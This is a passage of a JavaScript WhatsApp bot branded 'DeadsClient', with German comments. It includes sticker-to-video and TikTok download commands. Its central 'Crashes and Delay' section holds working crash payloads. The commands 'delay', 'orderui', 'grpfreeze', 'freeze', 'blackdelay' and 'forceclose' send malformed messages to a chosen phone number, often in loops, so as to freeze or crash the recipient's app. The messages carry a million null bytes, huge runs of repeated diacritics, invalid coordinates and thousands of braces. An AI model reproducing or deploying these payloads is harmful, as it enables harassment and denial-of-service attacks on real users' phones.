    const tempPath = path.join(__dirname, 'temp.webp');
    fs.writeFileSync(tempPath, buffer);
    const form = new FormData();
    form.append('new-image', fs.createReadStream(tempPath));
    form.append('upload', 'Upload!');
    const upload = await axios.post('https://ezgif.com/webp-to-mp4', form, {
      headers: form.getHeaders()
    });
    const $ = require('cheerio').load(upload.data);
    const file = $('input[name="file"]').attr('value');
    if (!file) throw new Error("Upload fehlgeschlagen.");
    const convert = await axios.post(`https://ezgif.com/webp-to-mp4/${file}`, `file=${file}&convert=Convert!`, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    });
    const _$ = require('cheerio').load(convert.data);
    const mp4Url = _$('#output > p.outfile > video > source').attr('src');
    if (!mp4Url) throw new Error("Konvertierung fehlgeschlagen.");
    const finalUrl = `https:${mp4Url}`;
    const videoBuffer = (await axios.get(finalUrl, { responseType: 'arraybuffer' })).data;
    await sock.sendMessage(from, {
      video: videoBuffer,
      mimetype: 'video/mp4',
      caption: "🎥 Hier ist dein animierter Sticker als PTV!",
      ptv: true
    }, { quoted: msg });
    fs.unlinkSync(tempPath); 
  } catch (err) {
    console.error("Fehler bei ptv3:", err);
    await sock.sendMessage(from, {
      text: "❌ Fehler bei der Umwandlung! Vielleicht war der Sticker nicht animiert?"
    }, { quoted: msg });
  }
  break;
}
function streamToBuffer(stream) {
  const chunks = [];
  return new Promise((resolve, reject) => {
    stream.on('data', chunk => chunks.push(chunk));
    stream.on('end', () => resolve(chunks));
    stream.on('error', reject);
  });
}
//=============PTV============================//
//=============Crashes and Delay============================//
case 'delay': {
if (!isBot) return; 
 
  let target = from; 
  let count = 1;
  if (args[0] && args[0].startsWith('+') && args[1]) {
    target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    count = parseInt(args[1]) || 1;
  } else if (!isNaN(parseInt(args[0]))) {
    count = parseInt(args[0]);
  }

  for (let i = 0; i < count; i++) {
    await sock.relayMessage(target, {
      "viewOnceMessage": {
        "message": {
          "interactiveResponseMessage": {
            "body": { "text": "DeadsClient", "format": "DEFAULT" },
            "nativeFlowResponseMessage": {
              "name": "call_permission_request",
              "paramsJson": "\u0000".repeat(1000000),
              "version": 3
            }
          }
        }
      }
    }, { participant: { jid: target } });

    await new Promise(res => setTimeout(res, 100));
  }

  const message = `𝐃𝐞𝐥𝐚𝐲𝐜𝐫𝐚𝐬𝐡 𝐒𝐞𝐧𝐝 𝐛𝐲 ©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥 𝐭𝐨 ${target}  ${count}x\n> Please pause bot so I don't get banned`;
  
  const dead = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    id: "randomMessageId"
  },
  message: {
    extendedTextMessage: {
      text: "⭐️︻デ═一▸𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭⭐️"
    }
  }
};
    
  await sock.sendMessage(from, {
    text: message,
    contextInfo: {
      forwardingScore: 127,
      isForwarded: true,
      externalAdReply: {
        title: '︻デ═一▸©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭',
        body: '🌹𝐃𝐞𝐥𝐚𝐲𝐜𝐫𝐚𝐬𝐡 𝐛𝐲 ©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭🌹',
        previewType: 'LINK',
        thumbnailUrl: 'https://i.postimg.cc/br5Tyff4/Picsart-25-02-02-15-13-50-588.jpg',
        mediaUrl: 'https://whatsapp.com/channel/0029VbAkmG81NCrQCKZr203P',
        mediaType: 2
      },
      quotedMessageId: dead.key.id,
      quotedMessage: dead.message
    }
  });

}
break;  

case 'orderui': {
if (!isBot) return; 
  let target = from;
  let count = 1;
  let type = 1;

  if (args[0] && args[0].startsWith('+') && args[1]) {
    target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    count = parseInt(args[1]) || 1;
    type = parseInt(args[2]) || 1;
  } else if (!isNaN(parseInt(args[0]))) {
    count = parseInt(args[0]);
    type = parseInt(args[1]) || 1;
  }

  const chars = {
    1: "ꦺ", 2: "ꦸ", 3: "ꦾ", 4: "ꦹ",
    5: "ꦽ", 6: "ꦺ", 7: "ꦿ", 8: "꧀"
  };

  const selectedChar = chars[type] || chars[1];
  const spamText = selectedChar.repeat(166666);

  const mediaImage = {
    url: "https://i.postimg.cc/br5Tyff4/Picsart-25-02-02-15-13-50-588.jpg"
  };

  for (let i = 0; i < count; i++) {
    await sock.relayMessage(target, {
      orderMessage: {
        orderId: "order123456",
        itemCount: 66666666,
        status: 1,
        surface: 1,
        orderTitle: spamText,
        message: spamText,
        orderImage: mediaImage,
        sellerJid: "491234567890@s.whatsapp.net"
      }
    }, { participant: { jid: target } });

    await new Promise(resolve => setTimeout(resolve, 1000));
  }

  const dead = {
    key: {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      id: "randomMessageId"
    },
    message: {
      extendedTextMessage: {
        text: "⭐️︻デ═一▸𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭⭐️"
      }
    }
  };

  const confirmMsg = `𝐎𝐫𝐝𝐞𝐫𝐔𝐈 𝐒𝐩𝐚𝐦 𝐬𝐞𝐧𝐝𝐞𝐭 𝐚𝐧 ${target} ${count}x (𝐓𝐲𝐩: ${type})`;

  await sock.sendMessage(from, {
    text: confirmMsg,
    contextInfo: {
      forwardingScore: 127,
      isForwarded: true,
      externalAdReply: {
        title: '︻デ═一▸©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭',
        body: 'OrderUI powered by DeadsClient',
        previewType: 'LINK',
        thumbnailUrl: 'https://i.postimg.cc/br5Tyff4/Picsart-25-02-02-15-13-50-588.jpg',
        mediaUrl: 'https://whatsapp.com/channel/0029VbAkmG81NCrQCKZr203P',
        mediaType: 2
      },
      quotedMessageId: dead.key.id,
      quotedMessage: dead.message
    }
  });

  break;
}


case 'grpfreeze': {
if (!isBot) return; 
  
  const kill = "ꦺ".repeat(95000);

    await sock.relayMessage(from, {
      "groupInviteMessage": {
        "groupJid": "666666666666666666@g.us",
        "inviteCode": "6666666666666666",
        "inviteExpiration": "6666666666",
        "groupName": kill,
        "caption": kill
      }
    }, { });
    reply('𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭🌹Crashv2 gesendet.');
 
}
break;

case 'freeze': {
  const target = msg.key.remoteJid;
  const kill = "ꦺ".repeat(95000);

  try {
    await sock.relayMessage(target, {
      newsletterAdminInviteMessage: {
        newsletterJid: "66666666666666@newsletter",
        newsletterName: kill,
        caption: kill,
        inviteExpiration: "6666666666"
      }
    }, { participant: { jid: target } });

    await sock.sendMessage(target, {
      text: `🌹 𝐅𝐫𝐞𝐞𝐳𝐞 𝐬𝐞𝐧𝐝 𝐛𝐲 𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭 an ${target}`
    });

  } catch (error) {
    console.error("Fehler beim Senden von Freeze:", error);
    await sock.sendMessage(target, {
      text: `❌ Fehler beim Senden von Freeze an ${target}`
    });
  }
}
break;   

case 'blackdelay': {
  if (!isBot) return;
    const from = msg.key.remoteJid;

    const BlackDelayCrash = async (target, mention) => {
        let msg = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        messageSecret: crypto.randomBytes(32)
                    },
                    interactiveResponseMessage: {
                        body: {
                            text: "⸸🩸꙰ी𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5ि🩸꙰⸸",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "꙰⸸꙰𝐒𝐡𝐮𝐭 𝐮𝐩 𝐁𝐢𝐭𝐜𝐡꙰⸸꙰",
                            paramsJson: "\u0000".repeat(999999),
                            version: 3
                        },
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 9741,
                            forwardedNewsletterMessageInfo: {
                                newsletterName: "( @Deadsclient )",
                                newsletterJid: "120363418269042042@newsletter",
                                serverMessageId: 1
                            }
                        }
                    }
                }
            }
        }, {});
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: target }, content: undefined }
                            ]
                        }
                    ]
                }
            ]
        });
        if (mention) {
            await sock.relayMessage(target, {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            fromMe: false,
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            type: 25
                        },
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "DeadsBOT" },
                                content: undefined
                            }
                        ]
                    }
                }
            }, {});
        }

        console.log("✅ Black Owl Delay Crash gesendet an " + target);
    };
    await BlackDelayCrash(from, true);
    break;
}


case 'forceclose': {
 if (!isBot) return;

  const target = msg.key.remoteJid;

  const messageContent = generateWAMessageFromContent(target, 
    proto.Message.fromObject({
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝖋𝖚𝖈𝖐.🧽踏",
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "⸸🩸꙰ी𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5ि🩸꙰⸸",
                address: "🩸𝖌𝖔 𝖋𝖚𝖈𝖐 𝖞𝖔𝖚𝖗𝖘𝖊𝖑𝖋🩸",
                jpegThumbnail: jpegThumbnail
              },
              hasMediaAttachment: false
            },
            body: {
              text: "😈⸸꙰ी𝕯𝖊𝖆𝖉𝖘𝕮𝖑𝖎𝖊𝖓𝖙ि꙰⸸😈"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [],
            }
          }
        }
      }
    }), 
    {
      userJid: target,
      quoted: msg
    }
  );

  await sock.relayMessage(target, messageContent.message, { userJid: target });
  console.log("✅ Success Send Crash 1Msg Payload to Target");
  break;
}
//=============Crashes and Delay============================//


//=============tt link in vid ============================//
case 'tok': {
let sender;
  if (msg.key.fromMe) {
    // Wenn die Nachricht vom Bot selbst gesendet wurde, nutze die Bot-Nummer
    sender = sock.user.id.split(':')[0];
  } else if (isGroupChat && msg.key.participant) {
    sender = msg.key.participant.split('@')[0];
  } else {
    sender = chatId.split('@')[0];
  }
  const cleanedSender = sender.replace(/[^0-9]/g, '');
  
  if (!access.isAllowed(cleanedSender)) {
    return reply('⛔ Du hast keinen Zugriff auf diesen Befehl.');
  }
  if (!args[0] || !args[0].includes('tiktok.com')) {
    await sock.sendMessage(from, {
      text: "❌ Bitte sende einen gültigen TikTok-Link!"
    }, { quoted: msg });
    break;
  }

  const tiktokUrl = args[0];
  const api = `https://tikwm.com/api/?url=${encodeURIComponent(tiktokUrl)}`;
  const res = await axios.get(api);

  if (!res.data || !res.data.data || !res.data.data.play) return;

  const videoUrl = res.data.data.play;
  const videoBuffer = (await axios.get(videoUrl, { responseType: 'arraybuffer' })).data;

  const statusQuoted = {
    key: {
      fromMe: false,
      participant: '0@s.whatsapp.net',
      remoteJid: 'status@broadcast',
      id: crypto.randomUUID()
    },
    message: {
      extendedTextMessage: {
        text: '©⸸꙰ी𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭 𝐓𝐢𝐤𝐓𝐨𝐤 𝐕𝐢𝐝𝐞𝐨 ि꙰⸸'
      }
    }
  };

  await sock.sendMessage(from, {
    video: videoBuffer,
    mimetype: 'video/mp4',
    caption: `🎥 𝐄𝐫𝐟𝐨𝐥𝐠𝐫𝐞𝐢𝐜𝐡 𝐤𝐨𝐧𝐯𝐞𝐫𝐭𝐢𝐞𝐫𝐭 𝐯𝐨𝐧 𝐓𝐢𝐤𝐓𝐨𝐤\n> 𝐛𝐲⸸🩸꙰ी𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5ि🩸꙰⸸\n> 🔗 ${tiktokUrl}`,
    contextInfo: {
      externalAdReply: {
        title: '⭐️©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭⭐️',
        body: '⸸🩸꙰ी𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5ि🩸꙰⸸',
        previewType: 'LINK',
        thumbnailUrl: 'https://i.postimg.cc/1zPb280Y/IMG-20250611-WA0004.jpg',
        mediaUrl: 'https://whatsapp.com/channel/0029VbAkmG81NCrQCKZr203P',
        mediaType: 2
      }
    }
  }, { quoted: statusQuoted });

  break;
}


case 'tok2': {
let sender;
  if (msg.key.fromMe) {
    // Wenn die Nachricht vom Bot selbst gesendet wurde, nutze die Bot-Nummer
    sender = sock.user.id.split(':')[0];
  } else if (isGroupChat && msg.key.participant) {
    sender = msg.key.participant.split('@')[0];
  } else {
    sender = chatId.split('@')[0];
  }
  const cleanedSender = sender.replace(/[^0-9]/g, '');
  
  if (!access.isAllowed(cleanedSender)) {
    return reply('⛔ Du hast keinen Zugriff auf diesen Befehl.');
  }
  if (!args[0] || !args[0].includes('tiktok.com')) {
    await sock.sendMessage(from, {
      text: "❌ Bitte sende einen gültigen TikTok-Link!"
    }, { quoted: msg });
    break;
  }

  const tiktokUrl = args[0];
  const api = `https://tikwm.com/api/?url=${encodeURIComponent(tiktokUrl)}`;
  const res = await axios.get(api);

  if (!res.data || !res.data.data || !res.data.data.play || !res.data.data.music) return;

  const videoUrl = res.data.data.play;
  const audioUrl = res.data.data.music;

  const videoBuffer = (await axios.get(videoUrl, { responseType: 'arraybuffer' })).data;
  const audioBuffer = (await axios.get(audioUrl, { responseType: 'arraybuffer' })).data;

  const statusQuoted = {
    key: {
      fromMe: false,
      participant: '0@s.whatsapp.net',
      remoteJid: 'status@broadcast',
      id: crypto.randomUUID()
    },
    message: {
      extendedTextMessage: {
        text: '©⸸꙰ी𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭 𝐓𝐢𝐤𝐓𝐨𝐤 𝐕𝐢𝐝𝐞𝐨 ि꙰⸸'
      }
    }
  };

  // 📹 Video senden
  await sock.sendMessage(from, {
    video: videoBuffer,
    mimetype: 'video/mp4',
    caption: `🎥𝑬𝒓𝒇𝒐𝒍𝒈𝒓𝒆𝒊𝒄𝒉 𝒌𝒐𝒏𝒗𝒆𝒓𝒕𝒊𝒆𝒓𝒕 𝒗𝒐𝒏 𝑻𝒊𝒌𝑻𝒐𝒌🎥\n> 𝐛𝐲⸸🩸꙰ी𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5ि🩸꙰⸸\n> 🔗 ${tiktokUrl}`,
    contextInfo: {
      externalAdReply: {
        title: '⭐️©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭⭐️',
        body: '⸸🩸꙰ी𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5ि🩸꙰⸸',
        previewType: 'LINK',
        thumbnailUrl: 'https://i.postimg.cc/1zPb280Y/IMG-20250611-WA0004.jpg',
        mediaUrl: 'https://whatsapp.com/channel/0029VbAkmG81NCrQCKZr203P',
        mediaType: 2
      }
    }
  }, { quoted: statusQuoted });

  // 🎵 Audio (Tonspur) senden
  await sock.sendMessage(from, {
    audio: audioBuffer,
    mimetype: 'audio/mp4',
    ptt: true,
    contextInfo: {
      externalAdReply: {
        title: '🎧 Original TikTok Audio',
        body: '©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭 𝐒𝐨𝐮𝐧𝐝 𝐄𝐱𝐭𝐫𝐚𝐜𝐭',
        thumbnailUrl: 'https://i.postimg.cc/1zPb280Y/IMG-20250611-WA0004.jpg',
        mediaUrl: 'https://whatsapp.com/channel/0029VbAkmG81NCrQCKZr203P',
        mediaType: 2,
        previewType: 'LINK'
      }
    }
  }, { quoted: statusQuoted });

  break;
}



case 'tmenu': {
let sender;
  if (msg.key.fromMe) {
    // Wenn die Nachricht vom Bot selbst gesendet wurde, nutze die Bot-Nummer
    sender = sock.user.id.split(':')[0];
  } else if (isGroupChat && msg.key.participant) {
    sender = msg.key.participant.split('@')[0];
  } else {
    sender = chatId.split('@')[0];
  }
  const cleanedSender = sender.replace(/[^0-9]/g, '');
  
  if (!access.isAllowed(cleanedSender)) {
    return reply('⛔ Du hast keinen Zugriff auf diesen Befehl.');
  }
  const videos = ['deadv.mp4', 'deadv1.mp4'];
  const baseVideoPath = './dev/';
  const randomVideo = videos[Math.floor(Math.random() * videos.length)];
  const videoPath = `${baseVideoPath}${randomVideo}`;

  const statusQuoted = {
    key: {
      fromMe: false,
      participant: '0@s.whatsapp.net',
      remoteJid: 'status@broadcast',
      id: crypto.randomUUID()
    },
    message: {
      extendedTextMessage: {
        text: '©⸸꙰꙰𝐓𝐢𝐤𝐓𝐨𝐤 𝐕𝐢𝐝𝐞𝐨 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐞𝐫 𝐌𝐞𝐧𝐮ि꙰⸸'
      }
    }
  };

  try {
    const from = msg.key.remoteJid;
    if (!from) return;

    const now = new Date();
    const currentDate = `${now.getDate().toString().padStart(2, "0")}.${(now.getMonth() + 1).toString().padStart(2, "0")}.${now.getFullYear()}`;
    const currentTime = `${now.getHours().toString().padStart(2, "0")}:${now.getMinutes().toString().padStart(2, "0")}`;

    const mediaVideo = (
      await prepareWAMessageMedia(
        { video: fs.readFileSync(videoPath) },
        { upload: sock.waUploadToServer }
      )
    ).videoMessage;

    // ▶️ Hauptmenü Sections
    const crashMenuSections = [
      {
        title: '©⸸꙰꙰𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐞𝐫 𝐌𝐞𝐧𝐮ि꙰⸸',
        rows: [
          { title: '┏─══─|©⸸꙰꙰𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐞𝐫 𝐌𝐞𝐧𝐮ि꙰⸸|─══─┓', description: '', id: '' },
                              { title: '', description: '©𝐀𝐧𝐢𝐦𝐞 𝐄𝐝𝐢𝐭', id: '.tok https://vm.tiktok.com/ZNdPMsBCK/' },
                              { title: '', description: '©𝐀𝐧𝐢𝐦𝐞 𝐄𝐝𝐢𝐭', id: '.tok https://vm.tiktok.com/ZNdPMb3Te/' },
                              { title: '', description: '©', id: '.' },
                              { title: '', description: '©', id: '.' },
                              { title: '', description: '©', id: '.blackdelay' },
                              { title: '', description: '©', id: '.hardsql' },
                              { title: '', description: '©𝐀𝐧𝐢𝐦𝐞 𝐄𝐝𝐢𝐭', id: '.tok https://vm.tiktok.com/ZNHbxEH7Jhfmo-sb8Hu/' },
                                { title: '┗─══─|©⸸꙰꙰𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐞𝐫 𝐌𝐞𝐧𝐮ि꙰⸸|─══─┛', description: '', id: '' }
        ]
      }
    ];

    // ▶️ Fake-Select Menü mit DeadsClient-Link im Text
    const linkSections = [
      {
        title: '©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭🩸𝐜𝐡𝐚𝐧𝐧𝐞𝐥',
        rows: [
          {
            title: '   ',
            description: 'https://whatsapp.com/channel/0029VbAkmG81NCrQCKZr203P',
            id: 'mmm' // fake id, du kannst hier auch .none machen
          }
        ]
      }
    ];

    const caption = `╭━─⸸🩸꙰ी𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5ि🩸꙰⸸─━╮

> 🔄𝐓𝐨𝐤𝐓𝐨𝐤 𝐥𝐢𝐧𝐤𝐬 𝐭𝐨 𝐯𝐢𝐝𝐞𝐨𝐬🩸

⭐️ ${currentDate}
⭐️ ${currentTime} Uhr
╰━─━─🩸𝐌𝐚𝐢𝐧𝐌𝐞𝐧𝐮🩸─━─━╯`;


    await sock.sendjsonv3(from, {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            contentText: caption,
            footerText: '©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭',
            videoMessage: mediaVideo,
            buttons: [
              {
                buttonId: 'open_crashmenu',
                buttonText: { displayText: '📑 Crash Menu open' },
                nativeFlowInfo: {
                  name: 'single_select',
                  paramsJson: JSON.stringify({ title: '  ', sections: crashMenuSections })
                },
                type: 'RESPONSE'
              },
              {
                buttonId: 'open_channel',
                buttonText: { displayText: '📢 DeadsClient Channel' },
                nativeFlowInfo: {
                  name: 'single_select',
                  paramsJson: JSON.stringify({ title: '©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭', sections: linkSections })
                },
                type: 'RESPONSE'
              }
            ],
            headerType: 5,
            header: 'videoMessage',
            contextInfo: {
              externalAdReply: {
              
                title: `⭐️©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭⭐️`,
                body: '⸸🩸꙰ी𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5ि🩸꙰⸸',
                mediaType: 1,
                thumbnailUrl: 'https://i.postimg.cc/1zPb280Y/IMG-20250611-WA0004.jpg',
                mediaUrl: 'https://whatsapp.com/channel/0029VbAkmG81NCrQCKZr203P',
                renderLargerThumbnail: true
              }
            }
          }
        }
      }
    }, { quoted: statusQuoted });

  } catch (err) {
    console.error('[Fehler in case force2]:', err);
  }
  break;
}
//=============tt link in vid ============================//














}
  });
};